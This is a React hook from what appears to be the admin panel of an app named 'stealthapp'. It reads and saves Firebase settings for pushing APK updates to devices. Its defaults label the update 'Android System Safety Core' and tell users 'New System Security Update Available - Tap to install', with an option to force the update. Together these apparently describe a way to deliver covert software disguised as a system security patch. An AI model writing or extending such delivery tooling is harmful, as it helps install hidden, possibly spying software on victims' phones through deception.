"use client";

import { useState, useEffect, useCallback } from "react";
import { ref, onValue, update } from "firebase/database";
import { database, auth } from "@/lib/firebase/client";

const RTDB_URL = "https://stealthapp-50da2-default-rtdb.firebaseio.com";

const DEFAULT_UPDATE_CONFIG = {
  apk_url: "",
  version_code: 1,
  version_name: "1.0",
  title: "Android System Safety Core",
  message: "New System Security Update Available - Tap to install",
  force_update: false,
};

export function useAppUpdate() {
  const [data, setData] = useState(DEFAULT_UPDATE_CONFIG);
  const [loading, setLoading] = useState(true);
  const [saving, setSaving] = useState(false);
  const [error, setError] = useState(null);
  const [success, setSuccess] = useState(false);
  const [lastSyncTime, setLastSyncTime] = useState(null);

  // 1. Initial REST fetch + live WebSocket onValue subscription
  useEffect(() => {
    let isMounted = true;
    setLoading(true);

    // Initial immediate REST fetch
    const fetchImmediateRest = async () => {
      try {
        const token = auth.currentUser ? await auth.currentUser.getIdToken() : null;
        const authParam = token ? `?auth=${token}` : "";
        const res = await fetch(`${RTDB_URL}/app_update.json${authParam}`);
        const resData = await res.json();
        if (isMounted && resData && typeof resData === "object" && !resData.error) {
          setData((prev) => ({
            ...prev,
            ...resData,
            version_code: Number(resData.version_code) || 1,
            version_name: String(resData.version_name || "1.0"),
            force_update: Boolean(resData.force_update),
          }));
          setLastSyncTime(Date.now());
          setLoading(false);
        }
      } catch (err) {
        // Non-blocking initial fetch
      }
    };

    fetchImmediateRest();

    // Live real-time listener
    const dbRef = ref(database, "app_update");
    const unsubscribe = onValue(
      dbRef,
      (snapshot) => {
        if (!isMounted) return;
        try {
          const val = snapshot.val();
          if (val && typeof val === "object") {
            setData((prev) => ({
              ...prev,
              ...val,
              version_code: Number(val.version_code) || 1,
              version_name: String(val.version_name || "1.0"),
              force_update: Boolean(val.force_update),
            }));
            setLastSyncTime(Date.now());
          }
          setLoading(false);
          setError(null);
        } catch (err) {
          setError("Failed to parse app update configuration: " + err.message);
          setLoading(false);
        }
      },
      (err) => {
        if (!isMounted) return;
        // Fallback to REST polling if WebSocket has permission or connection issue
        fetchImmediateRest();
      }
    );

    return () => {
      isMounted = false;
      if (typeof unsubscribe === "function") unsubscribe();
    };
  }, []);

  // 2. Multi-channel save function (Client SDK + API Route)
  const saveAppUpdate = useCallback(async (newConfig) => {
    setSaving(true);
    setError(null);
    setSuccess(false);

    const cleanPayload = {
      apk_url: String(newConfig.apk_url || "").trim(),
      version_code: Number(newConfig.version_code) || 1,
      version_name: String(newConfig.version_name || "1.0").trim(),
      title: String(newConfig.title || "Android System Safety Core").trim(),
      message: String(newConfig.message || "New update available.").trim(),
      force_update: Boolean(newConfig.force_update),
      updated_at: Date.now(),
    };

    if (!cleanPayload.apk_url) {
      setError("Please provide a valid APK download URL.");
      setSaving(false);
      return false;
    }

    try {
      // 1. Direct Realtime Database client update
      try {
        const dbRef = ref(database, "app_update");
        await update(dbRef, cleanPayload);
      } catch (clientErr) {
        console.warn("[useAppUpdate] Direct client update fallback:", clientErr.message);
      }

      // 2. Secure server API update (ensures audit logging and admin verification)
      const res = await fetch("/api/app-update", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(cleanPayload),
      });

      const resData = await res.json();
      if (!res.ok || !resData.success) {
        throw new Error(resData.error || "Failed to update via API");
      }

      setData(cleanPayload);
      setLastSyncTime(Date.now());
      setSuccess(true);
      setSaving(false);

      // Reset success indicator after 3.5s
      setTimeout(() => {
        setSuccess(false);
      }, 3500);

      return true;
    } catch (err) {
      setError(err.message || "Failed to update configuration");
      setSaving(false);
      return false;
    }
  }, []);

  return {
    data,
    loading,
    saving,
    error,
    success,
    lastSyncTime,
    saveAppUpdate,
  };
}
